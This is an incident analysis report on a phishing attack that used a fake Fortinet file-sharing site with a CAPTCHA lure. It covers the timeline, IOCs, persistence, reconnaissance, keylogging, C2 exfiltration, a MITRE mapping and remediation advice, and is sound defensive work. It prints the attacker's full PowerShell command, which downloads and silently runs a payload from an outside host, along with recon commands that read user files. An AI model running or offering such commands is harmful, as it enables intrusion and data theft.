# Incident Analysis Report

## Executive Summary

A multi-stage malware attack was detected targeting multiple workstations in the environment. The attack began with a **social engineering/phishing campaign** using a fake Fortinet file-sharing site, delivered malicious payloads via PowerShell, established persistence, and conducted reconnaissance and data exfiltration.

---

## Attack Timeline

| Time (UTC) | Event | Host | User |
|------------|-------|------|------|
| 17:46:32 | User visits malicious site `f1leshare.net` | ANDERS-DESKTOP | anders |
| 17:46:55 | PowerShell downloads and executes `updater.exe` | ANDERS-DESKTOP | anders |
| 17:47:11 | `updater.exe` created in Temp folder | ANDERS-DESKTOP | anders |
| 17:47:20 | Malware copies itself to `AppData\Local\Microsoft\` | ANDERS-DESKTOP | anders |
| 17:47:21 | **Persistence established** - Startup folder + Registry Run key | ANDERS-DESKTOP | anders |
| 17:47:45 | Same attack executed on JOHN-DESKTOP | JOHN-DESKTOP | john |
| 17:47:52 | C2 communication to `windowsupdater.tk` | ANDERS-DESKTOP | anders |
| 17:48:22 | Reconnaissance: Directory listing of `C:\Users` | ANDERS-DESKTOP | anders |
| 17:49:22 | Reconnaissance: Directory listing of Documents folder | ANDERS-DESKTOP | anders |
| 17:50:53 | Reconnaissance: Directory listing of Desktop folder | ANDERS-DESKTOP | anders |
| 17:51:53 | **Data exfiltration**: Reading `polen.eml` email file | ANDERS-DESKTOP | anders |
| 17:51:57 | **Keylogging detected** - `GetAsyncKeyState` API calls | ANDERS-DESKTOP | anders |

---

## Indicators of Compromise (IOCs)

### 1. Malicious Domains

| Domain | IP Address | Purpose | Evidence |
|--------|------------|---------|----------|
| `f1leshare.net` | 10.3.124.26 | Initial phishing site hosting fake Fortinet login | HTTP logs show fake Fortinet branded page with CAPTCHA verification trick |
| `miccosoftupdate.com` | Unknown | C2 server for data exfiltration | API calls from `updater.exe` to `/api/info` and `/api/data` |
| `windowsupdater.tk` | Unknown | Secondary C2 server | API calls to `/windows/checkforupdate` and `/update/servicedata` |

**Proof**: 
- HTTP response content shows fake Fortinet login page with JavaScript that generates PowerShell download commands
- URL query parameters: `file=kongsberggrupper-insider&share=nordnet.no` (targeting Kongsberg Group insider information)
- Email captured: `anders@kongsberg.com`

### 2. Malicious Files

| File Path | SHA256 | Description |
|-----------|--------|-------------|
| `C:\Users\{user}\AppData\Local\Temp\updater.exe` | Unknown | Initial payload downloaded by PowerShell |
| `C:\Users\anders\AppData\Local\Microsoft\updater.exe` | Unknown | Self-copied malware for persistence |
| `C:\Users\anders\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\msteamsupdater.exe` | Header: `4d5a90000300000004000000ffff0000` | Persistence mechanism - masquerades as Microsoft Teams updater |

**Proof**: File creation events show `updater.exe` creating `msteamsupdater.exe` in the Startup folder (17:47:21.479Z)

### 3. Registry Persistence

| Registry Path | Value | Evidence |
|---------------|-------|----------|
| `HKU\S-1-5-21-...\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdater` | `C:\Users\anders\AppData\Local\Microsoft\updater.exe` | Registry event at 17:47:21.479Z |

### 4. PowerShell Command (Initial Access)

```powershell
powershell -exec bypass -windowstyle hidden -command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; IWR -Uri 'http://f1leshare.net/download/updater' -OutFile $env:TEMP\updater.exe -UseBasicParsing; & $env:TEMP\updater.exe"
```

**Proof**: 
- Detected by "Suspicious Windows Powershell Arguments" rule (Risk Score: 47)
- Found in RunMRU registry key showing manual execution via Win+R
- Executed by users `anders` and `john` on separate hosts

### 5. Network Indicators

| Source IP | Destination | URL | Purpose |
|-----------|-------------|-----|---------|
| 10.3.10.21 | 10.3.124.26 | `http://f1leshare.net/download/updater` | Payload download |
| 10.3.10.21 | miccosoftupdate.com | `/api/info`, `/api/data` | C2 data exfiltration |
| 10.3.10.21 | windowsupdater.tk | `/windows/checkforupdate`, `/update/servicedata` | C2 check-in |

---

## Attack Details

### Phase 1: Initial Access (Social Engineering)
- Users received a link to `f1leshare.net` disguised as a Fortinet secure file-sharing service
- The site used a fake CAPTCHA verification that tricked users into copying and executing a PowerShell command
- The lure was "Kongsberg Grupper Insider" information shared via "nordnet.no"

### Phase 2: Execution
- PowerShell downloaded `updater.exe` from `f1leshare.net/download/updater`
- PowerShell executed with:
  - `-exec bypass` (bypass execution policy)
  - `-windowstyle hidden` (hide window)
  - SSL certificate validation disabled (`ServerCertificateValidationCallback={$true}`)

### Phase 3: Persistence
The malware established multiple persistence mechanisms:
1. **Registry Run key**: `MicrosoftUpdater` pointing to `updater.exe`
2. **Startup folder**: Created `msteamsupdater.exe` (masquerading as legitimate Teams updater)

### Phase 4: Discovery/Reconnaissance
The malware performed systematic reconnaissance:
- `cmd.exe /c dir "C:\Users"` - Listed all user profiles
- `cmd.exe /c dir "C:\Users\anders\Documents"` - Enumerated Documents folder
- `cmd.exe /c dir "C:\Users\anders\Desktop"` - Enumerated Desktop folder
- `cmd.exe /c type "C:\Users\anders\Desktop\polen.eml"` - **Read email file contents**

### Phase 5: Collection & Exfiltration
- Connected to C2 servers `miccosoftupdate.com` and `windowsupdater.tk`
- API calls to `/api/info`, `/api/data`, `/update/servicedata` endpoints
- **Keylogging activity detected**: Rapid `GetAsyncKeyState` API polling (448 background calls)

### Phase 6: Lateral Movement Indicators
- Same attack executed on multiple hosts (ANDERS-DESKTOP, JOHN-DESKTOP)
- Same PowerShell command executed by different users

---

## Affected Systems

| Hostname | IP Address | User | Compromise Status |
|----------|------------|------|-------------------|
| ANDERS-DESKTOP | 10.3.10.21 | anders | **FULLY COMPROMISED** |
| JOHN-DESKTOP | 10.3.10.22 | john | **COMPROMISED** |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|--------|-----------|-----|----------|
| Initial Access | Phishing | T1566 | Fake Fortinet file-sharing site |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 | PowerShell with encoded/bypass arguments |
| Persistence | Boot or Logon Autostart Execution: Registry Run Keys | T1547.001 | `MicrosoftUpdater` registry key |
| Persistence | Boot or Logon Autostart Execution: Startup Folder | T1547.001 | `msteamsupdater.exe` in Startup |
| Defense Evasion | Masquerading | T1036 | Fake Microsoft Teams updater name |
| Discovery | File and Directory Discovery | T1083 | Directory enumeration commands |
| Collection | Input Capture: Keylogging | T1056.001 | `GetAsyncKeyState` API calls |
| Exfiltration | Exfiltration Over C2 Channel | T1041 | HTTP requests to C2 domains |

---

## Recommendations

1. **Immediate Actions**:
   - Isolate ANDERS-DESKTOP and JOHN-DESKTOP from the network
   - Block all traffic to `f1leshare.net`, `miccosoftupdate.com`, and `windowsupdater.tk`
   - Remove persistence: Delete registry key `MicrosoftUpdater` and Startup folder file `msteamsupdater.exe`

2. **Investigation**:
   - Check for additional compromised hosts by searching for PowerShell executions with similar patterns
   - Review email logs for the phishing campaign delivery
   - Analyze the `polen.eml` file for sensitive information exposure

3. **Hardening**:
   - Implement PowerShell Constrained Language Mode
   - Enable AppLocker/Windows Defender Application Control
   - Block `.tk` and suspicious TLDs at the proxy level
   - User awareness training on social engineering tactics